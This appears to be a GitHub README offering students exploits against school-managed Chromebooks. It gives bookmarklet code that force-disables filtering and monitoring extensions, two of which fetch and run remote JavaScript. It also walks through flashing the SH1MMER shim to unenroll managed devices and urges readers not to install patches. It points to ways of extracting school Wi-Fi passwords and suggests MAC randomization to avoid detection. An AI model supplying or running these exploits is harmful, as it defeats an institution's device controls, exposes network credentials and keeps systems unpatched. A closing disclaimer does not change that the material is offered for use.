# Extension remover

## ATTENTION ALL SYS ADMINS!!! 

Hello, I am Echo and I created this repo in order to give exploits for the masses and to prove one thing, chromebooks are literal trash, and a poor excuse for a computer. They are full of exploits, you might think you blocked/patched them all but then 3 more pop up. It is a endless game of wack-a-mole. Treat your students to a windows computer, they will thank you. And don't you dare start to think "My school district does not have that kind of money", it most likely does! How much are you paying the blocker companies? Think about that.

## Back to your scheduled programming

![image](https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png)

credit LittleMissNyan for the swag logo

This bookmarklet exploit that can force-disable any extension installed on Google Chrome. Also known as LTBEEF.

**DO NOT UPDATE YOUR CHROMEBOOK! This exploit gets patched relatively quickly, so do not update!** Need help to stop updates? [Click here to learn how!](https://caub.glitch.me/)

If you need any help, please go here: https://github.com/3kh0/ext-remover/discussions

## Using sh1mmer

![2023_01_14_04q_Kleki](https://user-images.githubusercontent.com/58097612/212447514-61e4755b-fe01-408d-b11e-ec79cd71b6a2.png)

**PLEASE PLEASE PLEASE! Read everything before you start downloading, flashing, whatever, it will make sure you know what you are doing! If all of this seems scary for you, DO NOT, I repeat, DO NOT DO THIS!**

SH1MMER is an exploit capable of completely unenrolling enterprise-managed Chromebooks. It was found by the Mercury Workshop team

Before we get into this, please give a massive **massive MASSIVE** thank you to the devs behind this, they are the fricken coolest people on the planet like goddamn, thank you CoolElectronics, r58Playz, Bideos, Sharp_Jack, Unciaur, TheMemeSniper/Kaitlin, OlyB, CVFD, Rafflesia, Catakang, Bypassi, and aub! You can read about their roles in this cool project [here](https://sh1mmer.me/credits.html)

*You can view the full guide with fun pictures and what not here: https://sh1mmer.me/, more help can be found here: https://sh1mmer.me/tutorial.html*

### What you will need

- A USB with at least 8 GBs of storage
- A personal computer, note that you need admin perms on Windows/MacOS 
You just need a computer that can install the extension "Chromebook Recovery Utility" or balenaEtcher

### Writing to USB

- First, you'll need to find your school Chromebook's board name. This can be done by going to chrome://version on your Chromebook and copying the word after "stable-channel", or with a variety of other methods.
- If your board name is in the list below, you can continue on with the instructions:

brask, brya, clapper, coral, dedede, enguarde, glimmer, grunt, hana, hatch, jacuzzi, kukui, nami, octopus, orco, pyro, reks, sentry, stout, strongbad, tidus, ultima, volteer, zork

- On your personal computer, download the corresponding shim from the [SH1MMER file mirror](https://dl.sh1mmer.me/Beautiful%20World%20GUI%20Shims)
- Download the [Chromebook Recovery Utility](https://chrome.google.com/webstore/detail/pocpnlppkickgojjlmhdmidojbmbodfm) extension on your personal computer as well.
- Once the downloads are complete, launch the recovery utility by clicking on the icon and plug your USB into your personal computer. Note that your USB will be completely cleared and partitioned.
- In the recovery utility window, click the settings icon and press "use local image".
- Select your shim file, identify your USB, and start the writing process. This will take about 10 minutes. 

### Executing on Chromebook

- Once writing is complete, enter recovery mode on your Chromebook. This is done by pressing the power button, reload key (↻), and esc key at the same time.
- Press ctrl+d on this screen, then press enter.
- It will now say something about "returning to secure mode" or that "OS verification is off". You will most likely not actually be in dev mode, but the exploit will work regardless.
- On this screen, press the power button, reload key (↻), and esc key at the same time again! This is very important and cannot be skipped.
- Once it re-shows the original recovery screen, plug your shimmed USB into your Chromebook, and press the power button, reload key (↻), and esc key again. After a brief black-and-white loading screen, you should be in the SH1MMER menu. 
- Play around with the UI, exit, and reboot.

### What now?

You will now be able to, among other things, unenroll your Chromebook. It will now behave entirely as if it is a personal computer and no longer contain spyware or blocker extensions. After you do this and get past the "determining device configuration" screen, you will be able to actually turn dev mode on.

Note that while unenrolled, it is recommended to add your personal account first, then add your school account, then switch between the two as needed. **Mercury Workshop does not condone the use of SH1MMER or unenrolling to cheat in school.**

The biggest challenges with unenrolling are connecting to the school network and taking state or national exams (since there are no kiosk apps anymore).

There are many methods to get a school Wi-Fi password while enrolled, including the [policy netlog trick](https://luphoria.com/netlog-policy-password-tool). While on a school account and unenrolled, you can bypass Wi-Fi blocks by using a secure DNS such as Cloudflare 1.1.1.1 from chrome://os-settings/osPrivacy. It is also recommended to enable "MAC Address Randomization" in chrome://flags to stay hidden. 

To take a kiosk exam, the safest option is to re-enroll temporarily. Instructions for doing that are hosted [at this TXT file](https://sh1mmer.me/kiosks.txt). Saving a copy of this file for future reference is probably a smart move.

Again, I highly recommend that you check out the [website](https://sh1mmer.me/) for more detailed instructions and photos to help. Be sure to thank the people who have worked on the exploit [here](https://discord.gg/unblock)

- FAQ: https://sh1mmer.me/faq.html
- Credits: https://sh1mmer.me/credits.html

If you would like to learn more about this, check out these cool links:
- https://github.com/CoolElectronics/sh1mmer
- https://coolelectronics.me/blog/breaking-cros-2
- https://sh1mmer.me/
- https://www.youtube.com/watch?v=AYZBhfmLtxk

## Using Point Blank, 106 and higher.
1. [found by bypassi](https://blog.bypassi.com/_/point-blank/) . Bookmark this code 
```js
javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 125);
```
2. go to chrome://extensions, click on a extension that YOU installed from the Chrome Web Store, click details scroll down until you see View in chrome web store, AS SOON AS YOU CLICK ON IT SPAM ESC if it loads into chrome webstore try again, but if it is a blank screen press the bookmarklet and put the id of the extension in. Also, if you close the tab, it will stop working
## 106 And Higher Exploit

1.  Make a bookmarklet with this code ``` javascript:localStorage.cluster="UNKNOWN_SCHOOL,"+(confirm("ok = Disable\ncancel = Enable ")?99999999999999:0),opener.chrome.extension.getBackgroundPage().location.reload() ```
2. Go to tinyurl.com/goofcurly if you have securly, tinyurl.com/goofguardian if you have goguardian, tinurl.com/goofsi for blocksi, tinyurl.com/goofclassroom for securly classroom, and tinyurl.com/goofumbrella. 
3. Once your on the link depending on your blocker, click the button you see, it should open a about:blank tab, then click the bookmarklet and press ok, and all sites should be unblocked. Credit to the kajigs on the Titanium Network Discord.

## For v106 and up

![image](https://user-images.githubusercontent.com/58097612/207386423-e6aa2095-d92d-44a8-a3d6-e42066bdf34e.png)

The screenshot below was preformed on 108.0.5359.75 (Official Build) (64-bit) on the stable channel.

This has been tested and does work but has varying levels of success, you will need access to inspect element, more specifically, console.

- Open this URL on your chromebook: `chrome-extension://gndmhdcefbhlchkhipcnnbkcmicncehk/manifest.json` Shortened link: https://tinyurl.com/i-ltbeef
- Open inspect and navigate to the console tab.
- Run the basic LTBEEF code such as
```js
chrome.management.setEnabled('extensionid', false)
```

Replacing `extensionid` with the ID of the extension you want to disable, e.g. the stuff after the = in the URL bar when you click the extension's "details" button in chrome://extensions

Credit to SprinkzMC#8421 (aka Bypassi) for finding this!

![image](https://user-images.githubusercontent.com/58097612/207385046-5a9f6f07-6089-4775-9183-c11bd24ba02c.png)

To re-enable just go to the chrome web listing for the extension and click on the banner.

## For v106 and below

Here are the instructions to using this exploit! There are two ways, using the GUI and using the ids, the GUI method is better.

### Ingot (GUI)

Credit to Nebelung for this, [link to the github](https://github.com/FogNetwork/Ingot)

For easy setup go the the website at https://fognetwork.github.io/Ingot

1. Show your bookmarks bar with `ctrl + shift + b`
2. Right click on the bar and choose `Add Page`
3. Set the name to `Ingot` and the URL to the code below or [here](https://github.com/FogNetwork/Ingot/blob/main/bookmarklet.js)

```js
javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
```
**If this helped please give me a star!**

![image](https://user-images.githubusercontent.com/58097612/193318485-5267cd59-fb65-45a5-ad28-7f068bbce974.png)

### Using the GUI

Credit to CompactCow#4717 for the amazing UI!

1. Right click on the bar and choose `Add Page`
1. Set the name to `GUI` and the URL to the code below or [here](https://github.com/3kh0/ext-remover/blob/main/gui.js)
```js
javascript:fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
```

3. Visit https://chrome.google.com/webstorex. (This is a 404 page, and that is ok.)
4. Click the bookmark (Make sure you are on the page above!)
5. Use the menu to toggle your extensions!

**If this helped please give me a star!**

![image](https://user-images.githubusercontent.com/58097612/190276894-fc492c5c-b0ce-4943-ae56-603f75634618.png)

### Using IDs

#### Disabling 

1. Visit chrome://extensions and on the extension you want to disable click on Details
2. Copy the text in the URL after the `?id=`
> For example if you have this URL: `chrome://extensions/?id=echoontop` you would only copy `echoontop`
3.  Go to the file [`bookmark.js`](https://github.com/3kh0/ext-remover/blob/main/bookmark.js) and copy everything and create a new bookmark and use the code you copied as the Page URL
4. Visit https://chrome.google.com/webstorex. (This is a 404 page, and that is ok.)
5. Click the bookmark (Make sure you are on the page above!)
6.  Put the ID you copied into the text box.

You're done! The extension should now be disabled.

**If this helped please give me a star!**

#### Enabling

1. Visit chrome://extensions and on the extension you want to enable click on Details
2. Click View in Chrome Web Store
3. You will see a banner at the top of the page that says This item has been disabled in Chrome. Enable this item
4. Click on Enable this item

You're done! The extension should now be enabled.

**If this helped please give me a star!**

Credit bypassi for finding and making this exploit!

## How does it work
Well, it's pretty basic. It finds extensions and displays them on this page with some toggle switches.

![image](https://yeeteeyt.github.io/exploitbranch.png)

then, it detects when the toggle switch is toggled, and for what extension, then compiles a message to chrome that says "hey, turn this off for me". Chrome, mistaking this for the webstore complies.

![image](https://yeeteeyt.github.io/exploitgrid.png)

<h1><b>NOTE:</b></h1> DO NOT DO THIS IF YOU DON'T KNOW WHAT YOU ARE DOING! I don't recommend anyone do this, but I can't really control your will. What I can do, though, is warn you. Doing ANY of this will violate your school's policy and will possibly get you banned from electronics. This sticks to your record, and you won't get rid of it. Think about it, are you REALLY that desperate?

### Full unenrollment

<img src="https://media.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif" alt="Rickroll GIFs | Tenor"/>

There are still so many more fun exploits, please [join the TN](https://discord.gg/unblock) or [my discord](https://discord.gg/3kh0)
